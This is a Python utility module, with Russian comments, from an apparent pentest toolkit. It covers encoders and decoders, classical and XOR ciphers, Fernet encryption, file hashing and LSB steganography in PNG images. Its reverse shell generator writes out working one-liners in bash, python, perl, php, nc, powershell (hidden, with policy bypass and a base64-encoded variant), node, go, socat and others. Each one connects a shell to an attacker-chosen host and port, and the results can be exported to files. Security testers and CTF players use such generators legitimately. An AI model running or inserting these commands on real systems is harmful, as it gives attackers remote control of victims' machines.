"""
Утилиты: encode/decode, шифры, хеши, reverse shell, steganography (extended).
Author: idqwixxa

Возможности:
    ─── Encoder / Decoder ───
    - Base64 / Base32 / Base85 / Ascii85
    - Hex / URL / ROT13 / ROT-N / Binary / Octal
    - Unicode-escape / HTML-entity
    - Quoted-printable
    - JWT decode (без верификации)
    - URL-parse (схема/host/path/query)
    - Gzip / Zlib compress-decompress

    ─── Шифры ───
    - XOR (однобайтный + многобайтный ключ)
    - Caesar (brute-force)
    - ROT-N
    - Atbash
    - Vigenère (шифр/дешифр)
    - Rail fence
    - Reverse

    ─── AES (Fernet) ───
    - encrypt / decrypt
    - Генерация ключа

    ─── Хеши файлов ───
    - MD5 / SHA1 / SHA256 / SHA512 / BLAKE2
    - Рекурсивный обход директории
    - Экспорт CSV / JSON

    ─── Reverse shell ───
    - 15+ платформ (bash/python/perl/php/nc/powershell/ruby/go/node/...)
    - Base64-encoded variants
    - URL-encoded variants
    - Экспорт в JSON / Markdown

    ─── Steganography (LSB PNG) ───
    - hide / extract
    - Capacity check
    - Chi-square detection

    ─── Интеграция ───
    - Findings → notes (при обнаружении IoC в JSON/JWT)
    - Notify
    - Экспорт: JSON / CSV / HTML / Markdown
"""
import base64
import binascii
import codecs
import csv
import gzip
import hashlib
import html as html_mod
import json
import os
import re
import urllib.parse
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Callable

from cryptography.fernet import Fernet
from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

UTILS_DIR = REPORT_DIR / "utils"
UTILS_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class UtilsFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: UtilsFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["utils", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


def _notify(title: str, msg: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(title, msg, severity=severity)
    except Exception:
        pass


# ===========================================================================
# Encoder / Decoder
# ===========================================================================

def b64_encode(s: str) -> str:
    """Base64-кодирование строки."""
    return base64.b64encode(s.encode()).decode()


def b64_decode(s: str) -> str:
    """Base64-декодирование строки."""
    return base64.b64decode(s.encode()).decode(errors="ignore")


def _hex_encode(s: str) -> str:
    return s.encode().hex()


def _hex_decode(s: str) -> str:
    return bytes.fromhex(s).decode(errors="ignore")


def _url_encode(s: str) -> str:
    return urllib.parse.quote(s)


def _url_decode(s: str) -> str:
    return urllib.parse.unquote(s)


def _rot13(s: str) -> str:
    return codecs.encode(s, "rot_13")


def _binary_encode(s: str) -> str:
    return " ".join(format(b, "08b") for b in s.encode())


def _binary_decode(s: str) -> str:
    return "".join(chr(int(b, 2)) for b in s.split())


def _b32_encode(s: str) -> str:
    return base64.b32encode(s.encode()).decode()


def _b32_decode(s: str) -> str:
    return base64.b32decode(s.encode(),
                              casefold=True).decode(errors="ignore")


def _b85_encode(s: str) -> str:
    return base64.b85encode(s.encode()).decode()


def _b85_decode(s: str) -> str:
    return base64.b85decode(s.encode()).decode(errors="ignore")


def _a85_encode(s: str) -> str:
    return base64.a85encode(s.encode()).decode()


def _a85_decode(s: str) -> str:
    return base64.a85decode(s.encode()).decode(errors="ignore")


def _octal_encode(s: str) -> str:
    return " ".join(f"{b:o}" for b in s.encode())


def _octal_decode(s: str) -> str:
    return "".join(chr(int(b, 8)) for b in s.split())


def _unicode_escape_encode(s: str) -> str:
    return s.encode("unicode_escape").decode()


def _unicode_escape_decode(s: str) -> str:
    return s.encode().decode("unicode_escape")


def _html_entity_encode(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)


def _html_entity_decode(s: str) -> str:
    import html
    return html.unescape(s)


def _rotn_encode(s: str) -> str:
    """ROT-N — N задаётся через #<N># в начале."""
    m = re.match(r"#(\d+)#(.*)", s, re.DOTALL)
    if not m:
        raise ValueError("Формат: #N#текст (например #5#Hello)")
    n = int(m.group(1))
    text = m.group(2)
    return "".join(
        chr((ord(c) - 32 + n) % 95 + 32) if 32 <= ord(c) < 127 else c
        for c in text
    )


def _rotn_decode(s: str) -> str:
    m = re.match(r"#(\d+)#(.*)", s, re.DOTALL)
    if not m:
        raise ValueError("Формат: #N#текст")
    n = int(m.group(1))
    text = m.group(2)
    return "".join(
        chr((ord(c) - 32 - n) % 95 + 32) if 32 <= ord(c) < 127 else c
        for c in text
    )


def _gzip_encode(s: str) -> str:
    return base64.b64encode(gzip.compress(s.encode())).decode()


def _gzip_decode(s: str) -> str:
    return gzip.decompress(base64.b64decode(s.encode())).decode(
        errors="ignore")


def _zlib_encode(s: str) -> str:
    return base64.b64encode(zlib.compress(s.encode())).decode()


def _zlib_decode(s: str) -> str:
    return zlib.decompress(base64.b64decode(s.encode())).decode(
        errors="ignore")


def _jwt_decode(s: str) -> str:
    """Декодировать JWT payload (без верификации)."""
    parts = s.strip().split(".")
    if len(parts) < 2:
        raise ValueError("JWT должен иметь ≥ 2 частей")
    def _pad(p: str) -> str:
        return p + "=" * (-len(p) % 4)
    try:
        hdr = json.loads(base64.urlsafe_b64decode(_pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(_pad(parts[1])))
    except Exception as exc:
        raise ValueError(f"Невалидный JWT: {exc}")
    out = {"header": hdr, "payload": payload}
    # Findings для подозрительных полей
    if isinstance(payload, dict):
        suspicious = {k: v for k, v in payload.items()
                      if k.lower() in ("password", "secret", "key",
                                         "token", "apikey", "api_key")}
        if suspicious:
            _save_finding(UtilsFinding(
                kind="jwt_secrets",
                severity="high",
                title="JWT содержит чувствительные поля",
                target="jwt",
                evidence=json.dumps(suspicious, ensure_ascii=False)[:500],
                data={"fields": list(suspicious.keys())},
            ))
    return json.dumps(out, indent=2, ensure_ascii=False)


def _url_parse(s: str) -> str:
    p = urllib.parse.urlparse(s)
    qs = urllib.parse.parse_qs(p.query)
    out = {
        "scheme": p.scheme,
        "netloc": p.netloc,
        "hostname": p.hostname,
        "port": p.port,
        "path": p.path,
        "params": p.params,
        "query": qs,
        "fragment": p.fragment,
    }
    return json.dumps(out, indent=2, ensure_ascii=False)


ENCODERS: dict[str, Callable[[str], str]] = {
    "base64-encode": b64_encode,
    "base64-decode": b64_decode,
    "base32-encode": _b32_encode,
    "base32-decode": _b32_decode,
    "base85-encode": _b85_encode,
    "base85-decode": _b85_decode,
    "ascii85-encode": _a85_encode,
    "ascii85-decode": _a85_decode,
    "hex-encode": _hex_encode,
    "hex-decode": _hex_decode,
    "url-encode": _url_encode,
    "url-decode": _url_decode,
    "rot13": _rot13,
    "rot-n-encode": _rotn_encode,
    "rot-n-decode": _rotn_decode,
    "binary-encode": _binary_encode,
    "binary-decode": _binary_decode,
    "octal-encode": _octal_encode,
    "octal-decode": _octal_decode,
    "unicode-escape-encode": _unicode_escape_encode,
    "unicode-escape-decode": _unicode_escape_decode,
    "html-entity-encode": _html_entity_encode,
    "html-entity-decode": _html_entity_decode,
    "gzip-encode": _gzip_encode,
    "gzip-decode": _gzip_decode,
    "zlib-encode": _zlib_encode,
    "zlib-decode": _zlib_decode,
    "jwt-decode": _jwt_decode,
    "url-parse": _url_parse,
}


def encoder_decoder() -> None:
    """Интерактивный encoder/decoder."""
    table = Table(title="Encoder/Decoder")
    table.add_column("№")
    table.add_column("Операция")
    ops = list(ENCODERS.keys())
    for i, name in enumerate(ops, 1):
        table.add_row(str(i), name)
    console.print(table)
    c = Prompt.ask("Выбор",
                    choices=[str(i) for i in range(1, len(ops) + 1)])
    data = Prompt.ask("Данные")
    try:
        result = ENCODERS[ops[int(c) - 1]](data)
        console.print(f"[green]{result}[/green]")
        db.save_scan(
            "encode",
            ops[int(c) - 1],
            {"input": data[:20], "output": result[:64]},
        )
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")


# ===========================================================================
# AES (Fernet)
# ===========================================================================

def aes_encrypt_decrypt() -> None:
    """AES (Fernet) шифрование/дешифрование строки."""
    action = Prompt.ask("Действие", choices=["encrypt", "decrypt"])
    if action == "encrypt":
        key = Fernet.generate_key()
        data = Prompt.ask("Текст").encode()
        token = Fernet(key).encrypt(data)
        console.print(f"[cyan]Key:[/cyan] {key.decode()}")
        console.print(f"[green]Ciphertext:[/green] {token.decode()}")
        db.save_scan("aes_enc", data[:20].decode(errors="ignore"),
                     {"key": key.decode(), "ct": token.decode()})
    else:
        key = Prompt.ask("Key").encode()
        token = Prompt.ask("Ciphertext").encode()
        try:
            plain = Fernet(key).decrypt(token).decode()
            console.print(f"[green]{plain}[/green]")
            db.save_scan("aes_dec",
                          token[:20].decode(errors="ignore"),
                          {"plain": plain})
        except Exception as exc:  # noqa: BLE001
            console.print(f"[red]Ошибка: {exc}[/red]")


# ===========================================================================
# XOR
# ===========================================================================

def xor_cipher() -> None:
    """XOR-шифр с одним байтом-ключом."""
    data = Prompt.ask("Данные").encode()
    key = Prompt.ask("Ключ (число 0-255)", default="42")
    try:
        k = int(key) & 0xFF
        out = bytes(b ^ k for b in data)
        console.print(f"[green]{out.hex()}[/green]")
        db.save_scan("xor", key,
                     {"input": data[:20].decode(errors="ignore"),
                      "hex": out.hex()})
    except ValueError:
        console.print("[red]Ключ должен быть числом.[/red]")


def xor_decrypt() -> None:
    """Обратный XOR: hex + ключ → текст."""
    hex_data = Prompt.ask("Hex-данные")
    key = Prompt.ask("Ключ (число 0-255)", default="42")
    try:
        k = int(key) & 0xFF
        data = bytes.fromhex(hex_data)
        out = bytes(b ^ k for b in data).decode(errors="ignore")
        console.print(f"[green]{out}[/green]")
    except ValueError as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")


def xor_multi() -> None:
    """XOR с многобайтным ключом-строкой."""
    action = Prompt.ask("Действие",
                         choices=["encrypt", "decrypt"])
    if action == "encrypt":
        data = Prompt.ask("Данные").encode()
        key = Prompt.ask("Ключ (строка)").encode()
        out = bytes(b ^ key[i % len(key)]
                     for i, b in enumerate(data))
        console.print(f"[green]{out.hex()}[/green]")
    else:
        hex_data = Prompt.ask("Hex-данные")
        key = Prompt.ask("Ключ (строка)").encode()
        data = bytes.fromhex(hex_data)
        out = bytes(b ^ key[i % len(key)]
                     for i, b in enumerate(data))
        console.print(f"[green]{out.decode(errors='ignore')}[/green]")


# ===========================================================================
# Классические шифры
# ===========================================================================

def _caesar(text: str, shift: int) -> str:
    out = []
    for c in text:
        if c.islower():
            out.append(chr((ord(c) - 97 + shift) % 26 + 97))
        elif c.isupper():
            out.append(chr((ord(c) - 65 + shift) % 26 + 65))
        else:
            out.append(c)
    return "".join(out)


def caesar_bruteforce() -> None:
    """Показать все 26 сдвигов Caesar."""
    text = Prompt.ask("Текст")
    table = Table(title="Caesar brute-force")
    table.add_column("Shift", style="cyan", width=6)
    table.add_column("Result", style="green")
    for shift in range(1, 26):
        table.add_row(str(shift), _caesar(text, -shift))
    console.print(table)


def _vigenere(text: str, key: str, decrypt: bool = False) -> str:
    out = []
    ki = 0
    for c in text:
        if c.isalpha():
            shift = ord(key[ki % len(key)].lower()) - 97
            if decrypt:
                shift = -shift
            if c.islower():
                out.append(chr((ord(c) - 97 + shift) % 26 + 97))
            else:
                out.append(chr((ord(c) - 65 + shift) % 26 + 65))
            ki += 1
        else:
            out.append(c)
    return "".join(out)


def vigenere_tool() -> None:
    action = Prompt.ask("Действие",
                         choices=["encrypt", "decrypt"])
    text = Prompt.ask("Текст")
    key = Prompt.ask("Ключ (буквы)")
    out = _vigenere(text, key, decrypt=(action == "decrypt"))
    console.print(f"[green]{out}[/green]")


def _atbash(text: str) -> str:
    out = []
    for c in text:
        if c.islower():
            out.append(chr(122 - (ord(c) - 97)))
        elif c.isupper():
            out.append(chr(90 - (ord(c) - 65)))
        else:
            out.append(c)
    return "".join(out)


def _rail_fence(text: str, rails: int, decrypt: bool = False) -> str:
    if rails < 2:
        return text
    if decrypt:
        # Reconstruct
        n = len(text)
        pattern = []
        r = 0
        d = 1
        for _ in range(n):
            pattern.append(r)
            r += d
            if r == rails - 1 or r == 0:
                d = -d
        out = [""] * n
        idx = 0
        for rail in range(rails):
            for i, r in enumerate(pattern):
                if r == rail:
                    out[i] = text[idx]
                    idx += 1
        return "".join(out)
    # Encrypt
    rows = [""] * rails
    r = 0
    d = 1
    for c in text:
        rows[r] += c
        r += d
        if r == rails - 1 or r == 0:
            d = -d
    return "".join(rows)


def rail_fence_tool() -> None:
    action = Prompt.ask("Действие",
                         choices=["encrypt", "decrypt"])
    text = Prompt.ask("Текст")
    rails = IntPrompt.ask("Rail-ов", default=3)
    out = _rail_fence(text, rails, decrypt=(action == "decrypt"))
    console.print(f"[green]{out}[/green]")


def cipher_menu() -> None:
    t = Table(title="Классические шифры")
    t.add_column("№", style="yellow")
    t.add_column("Опция")
    opts = [
        ("1", "Caesar brute-force (все 26 сдвигов)"),
        ("2", "Vigenère (encrypt/decrypt)"),
        ("3", "Atbash"),
        ("4", "Rail fence (encrypt/decrypt)"),
        ("5", "Reverse"),
    ]
    for n, o in opts:
        t.add_row(n, o)
    console.print(t)
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        caesar_bruteforce()
    elif c == "2":
        vigenere_tool()
    elif c == "3":
        console.print(f"[green]{_atbash(Prompt.ask('Текст'))}[/green]")
    elif c == "4":
        rail_fence_tool()
    elif c == "5":
        console.print(f"[green]{Prompt.ask('Текст')[::-1]}[/green]")


# ===========================================================================
# File hashes
# ===========================================================================

def file_hashes(path: str) -> None:
    """Хеши файла или всех файлов в папке."""
    p = Path(path)
    if not p.exists():
        console.print("[red]Путь не найден.[/red]")
        return
    files = [p] if p.is_file() else [f for f in p.rglob("*")
                                       if f.is_file()]
    if not files:
        console.print("[yellow]Файлов нет.[/yellow]")
        return
    table = Table(title=f"Хеши ({len(files)} файлов)")
    table.add_column("Файл", style="cyan", max_width=40)
    table.add_column("MD5", width=16)
    table.add_column("SHA1", width=16)
    table.add_column("SHA256", width=24)
    results = []
    for f in files:
        md5 = hashlib.md5()
        sha1 = hashlib.sha1()
        sha = hashlib.sha256()
        try:
            with f.open("rb") as fh:
                for chunk in iter(lambda: fh.read(8192), b""):
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha.update(chunk)
        except Exception as exc:  # noqa: BLE001
            table.add_row(str(f.name), "[red]err[/red]", "—", "—")
            continue
        table.add_row(
            str(f.name)[:40],
            md5.hexdigest()[:16],
            sha1.hexdigest()[:16],
            sha.hexdigest()[:24],
        )
        results.append({
            "file": str(f),
            "size": f.stat().st_size,
            "md5": md5.hexdigest(),
            "sha1": sha1.hexdigest(),
            "sha256": sha.hexdigest(),
            "sha512": _file_hash(f, "sha512"),
            "blake2b": _file_hash(f, "blake2b"),
        })
    console.print(table)
    db.save_scan("filehash", str(p), {"count": len(files)})
    if Confirm.ask("Экспорт результатов?", default=False):
        fmt = Prompt.ask("Формат",
                          choices=["json", "csv", "html"],
                          default="json")
        export_hashes(results, fmt=fmt)


def _file_hash(path: Path, algo: str) -> str:
    try:
        h = hashlib.new(algo)
        with path.open("rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return ""


def export_hashes(results: list[dict], fmt: str = "json") -> Path | None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"json": ".json", "csv": ".csv", "html": ".html"}[fmt]
    path = UTILS_DIR / f"hashes_{ts}{ext}"
    try:
        if fmt == "json":
            path.write_text(
                json.dumps(results, indent=2, ensure_ascii=False),
                encoding="utf-8")
        elif fmt == "csv":
            with open(path, "w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["file", "size", "md5", "sha1",
                            "sha256", "sha512", "blake2b"])
                for r in results:
                    w.writerow([r[k] for k in
                                ("file", "size", "md5", "sha1",
                                 "sha256", "sha512", "blake2b")])
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html><head>"
                "<meta charset='utf-8'><title>File hashes</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;"
                "font-family:monospace;padding:24px;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;"
                "font-size:12px;}",
                "th{background:#111;color:#00ff9c;padding:6px;"
                "border:1px solid #222;text-align:left;}",
                "td{padding:4px 6px;border:1px solid #222;"
                "word-break:break-all;}",
                "tr:nth-child(even){background:#0d0d0d;}",
                "</style></head><body>",
                f"<h1>📁 File hashes ({len(results)})</h1>",
                "<table><tr><th>File</th><th>Size</th><th>MD5</th>"
                "<th>SHA1</th><th>SHA256</th><th>SHA512</th></tr>",
            ]
            for r in results:
                parts.append(
                    f"<tr><td>{html_mod.escape(r['file'][:60])}</td>"
                    f"<td>{r['size']}</td>"
                    f"<td>{r['md5'][:16]}</td>"
                    f"<td>{r['sha1'][:16]}</td>"
                    f"<td>{r['sha256'][:32]}</td>"
                    f"<td>{r['sha512'][:32]}</td></tr>")
            parts.append("</table></body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {path}[/green]")
        return path
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Экспорт: {exc}[/red]")
        return None


# ===========================================================================
# Reverse shell generator
# ===========================================================================

def _revshell_build(lhost: str, lport: str) -> dict[str, str]:
    """Собрать все варианты reverse-shell."""
    return {
        "bash-tcp": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash-196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; "
                    f"sh <&196 >&196 2>&196",
        "bash-readline": (
            f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read "
            f"line; do $line 2>&5 >&5; done"
        ),
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "python2": (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
            f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ),
        "php": (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "ruby": (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport});"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\","
            f"f.fileno(),f.fileno(),f.fileno())'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "nc-mkfifo": (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc {lhost} {lport} >/tmp/f"
        ),
        "java": (
            f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\","
            f"\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};"
            f"cat <&5 | while read line; do \\$line 2>&5 >&5; "
            f"done\"]);p.waitFor();"
        ),
        "go": (
            f"echo 'package main;import\"os/exec\";import\"net\";"
            f"func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");"
            f"cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;"
            f"cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && "
            f"go run /tmp/t.go && rm /tmp/t.go"
        ),
        "node": (
            f"(function(){{var net=require(\"net\"),"
            f"cp=require(\"child_process\"),"
            f"sh=cp.spawn(\"/bin/sh\",[]);"
            f"var client=new net.Socket();"
            f"client.connect({lport},\"{lhost}\",function(){{"
            f"client.pipe(sh.stdin);sh.stdout.pipe(client);"
            f"sh.stderr.pipe(client);}});}})();"
        ),
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"$c=New-Object System.Net.Sockets.TCPClient("
            f"'{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object -TypeName System.Text.ASCIIEncoding)"
            f".GetString($b,0,$i);"
            f"$sb=(iex $d 2>&1|Out-String);"
            f"$sb2=$sb+'PS '+(pwd).Path+'> ';"
            f"$sbt=([text.encoding]::ASCII).GetBytes($sb2);"
            f"$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
        ),
        "powershell-b64": "—",  # заполняется ниже
        "socat": (
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
            f"tcp:{lhost}:{lport}"
        ),
        "lua": (
            f"lua -e \"require('socket');require('os');"
            f"t=socket.tcp();t:connect('{lhost}','{lport}');"
            f"os.execute('/bin/sh -i <&3 >&3 2>&3')\""
        ),
    }


def reverse_shell_generator() -> None:
    """Генератор reverse shell."""
    lhost = Prompt.ask("LHOST")
    lport = Prompt.ask("LPORT", default="4444")
    shells = _revshell_build(lhost, lport)

    # Base64 encoded powershell
    ps = shells["powershell"]
    ps_b64 = base64.b64encode(ps.encode("utf-16le")).decode()
    shells["powershell-b64"] = (
        f"powershell -EncodedCommand {ps_b64}"
    )

    table = Table(title=f"💀 Reverse shells — {lhost}:{lport}")
    table.add_column("#", width=4)
    table.add_column("Shell", style="cyan", width=16)
    table.add_column("Command", style="green", max_width=110)
    for i, (name, cmd) in enumerate(shells.items(), 1):
        table.add_row(str(i), name, cmd[:110] + ("…" if len(cmd) > 110
                                                    else ""))
    console.print(table)

    db.save_scan("revshell", f"{lhost}:{lport}",
                 list(shells.keys()))

    if Confirm.ask("Экспорт в файл?", default=False):
        fmt = Prompt.ask("Формат",
                          choices=["md", "json", "html"],
                          default="md")
        export_revshells(shells, lhost, lport, fmt=fmt)


def export_revshells(shells: dict, lhost: str, lport: str,
                      fmt: str = "md") -> Path | None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"md": ".md", "json": ".json", "html": ".html"}[fmt]
    path = UTILS_DIR / f"revshells_{lhost}_{lport}_{ts}{ext}"
    try:
        if fmt == "md":
            lines = [
                f"# Reverse Shells — {lhost}:{lport}",
                f"_Generated: {datetime.now().isoformat()}_",
                "",
            ]
            for name, cmd in shells.items():
                lines.append(f"## {name}")
                lines.append("```")
                lines.append(cmd)
                lines.append("```")
                lines.append("")
            path.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "json":
            path.write_text(
                json.dumps({"lhost": lhost, "lport": lport,
                             "shells": shells}, indent=2,
                            ensure_ascii=False),
                encoding="utf-8")
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html><head>"
                "<meta charset='utf-8'><title>Reverse Shells</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;"
                "font-family:monospace;padding:24px;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "h2{color:#7ad9ff;}",
                "pre{background:#111;border:1px solid #222;"
                "padding:10px;color:#a0ffa0;overflow-x:auto;"
                "font-size:12px;}",
                "</style></head><body>",
                f"<h1>💀 Reverse shells — "
                f"{html_mod.escape(lhost)}:{lport}</h1>",
            ]
            for name, cmd in shells.items():
                parts.append(f"<h2>{html_mod.escape(name)}</h2>")
                parts.append(f"<pre>{html_mod.escape(cmd)}</pre>")
            parts.append("</body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {path}[/green]")
        return path
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Экспорт: {exc}[/red]")
        return None


# ===========================================================================
# Steganography (LSB PNG)
# ===========================================================================

def _text_to_bits(text: str) -> str:
    data = text.encode("utf-8")
    bits = "".join(f"{b:08b}" for b in data)
    return bits + "00000000"


def _bits_to_text(bits: str) -> str:
    out_bytes = bytearray()
    for i in range(0, len(bits) - 7, 8):
        chunk = bits[i:i + 8]
        if len(chunk) < 8:
            break
        val = int(chunk, 2)
        if val == 0:
            break
        out_bytes.append(val)
    return out_bytes.decode("utf-8", errors="ignore")


def stego_hide(image_path: str, text: str, out_path: str) -> None:
    """Скрыть текст в PNG через LSB."""
    try:
        from PIL import Image
    except ImportError:
        console.print("[red]Pillow не установлен.[/red]")
        return

    src = Path(image_path)
    if not src.exists():
        console.print("[red]Файл-источник не найден.[/red]")
        return

    img = Image.open(src).convert("RGB")
    pixels = list(img.getdata())
    bits = _text_to_bits(text)
    capacity = len(pixels) * 3
    if len(bits) > capacity:
        console.print(
            f"[red]Недостаточно места: нужно {len(bits)} бит, "
            f"есть {capacity}.[/red]"
        )
        return

    new_pixels = []
    bit_idx = 0
    for r, g, b in pixels:
        if bit_idx < len(bits):
            r = (r & ~1) | int(bits[bit_idx]); bit_idx += 1
        if bit_idx < len(bits):
            g = (g & ~1) | int(bits[bit_idx]); bit_idx += 1
        if bit_idx < len(bits):
            b = (b & ~1) | int(bits[bit_idx]); bit_idx += 1
        new_pixels.append((r, g, b))

    out = Image.new("RGB", img.size)
    out.putdata(new_pixels)
    out.save(out_path, "PNG")
    console.print(f"[green]✓ Текст скрыт в {out_path} "
                  f"({len(bits)} бит)[/green]")
    db.save_scan("stego_hide", str(src),
                  {"out": out_path, "bits": len(bits)})


def stego_extract(image_path: str) -> None:
    """Извлечь скрытый текст из PNG (LSB)."""
    try:
        from PIL import Image
    except ImportError:
        console.print("[red]Pillow не установлен.[/red]")
        return

    p = Path(image_path)
    if not p.exists():
        console.print("[red]Файл не найден.[/red]")
        return

    img = Image.open(p).convert("RGB")
    bits: list[str] = []
    for r, g, b in img.getdata():
        bits.append(str(r & 1))
        bits.append(str(g & 1))
        bits.append(str(b & 1))
    text = _bits_to_text("".join(bits))
    if text:
        console.print(f"[green]{text}[/green]")
        db.save_scan("stego_extract", str(p), {"text": text[:200]})
    else:
        console.print("[yellow]Скрытого текста не найдено.[/yellow]")


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🛠  Утилиты (extended)[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Encoder/Decoder (30+ операций)"),
        ("2", "AES (Fernet) encrypt/decrypt"),
        ("3", "XOR-шифр (однобайтный)"),
        ("4", "XOR-дешифрование (однобайтный)"),
        ("5", "XOR многобайтный (enc/dec)"),
        ("6", "Классические шифры (Caesar/Vigenère/Atbash/Rail fence)"),
        ("7", "Хеши файла/папки (5 алгоритмов)"),
        ("8", "Reverse shell generator (15+ вариантов)"),
        ("9", "Скрыть текст в PNG (LSB-stego)"),
        ("10", "Извлечь текст из PNG (LSB-stego)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])
    if c == "1":
        encoder_decoder()
    elif c == "2":
        aes_encrypt_decrypt()
    elif c == "3":
        xor_cipher()
    elif c == "4":
        xor_decrypt()
    elif c == "5":
        xor_multi()
    elif c == "6":
        cipher_menu()
    elif c == "7":
        file_hashes(Prompt.ask("Путь"))
    elif c == "8":
        reverse_shell_generator()
    elif c == "9":
        img = Prompt.ask("Исходное изображение (PNG)")
        txt = Prompt.ask("Текст")
        out = Prompt.ask("Куда сохранить (PNG)",
                         default="stego_out.png")
        stego_hide(img, txt, out)
    elif c == "10":
        stego_extract(Prompt.ask("PNG-файл"))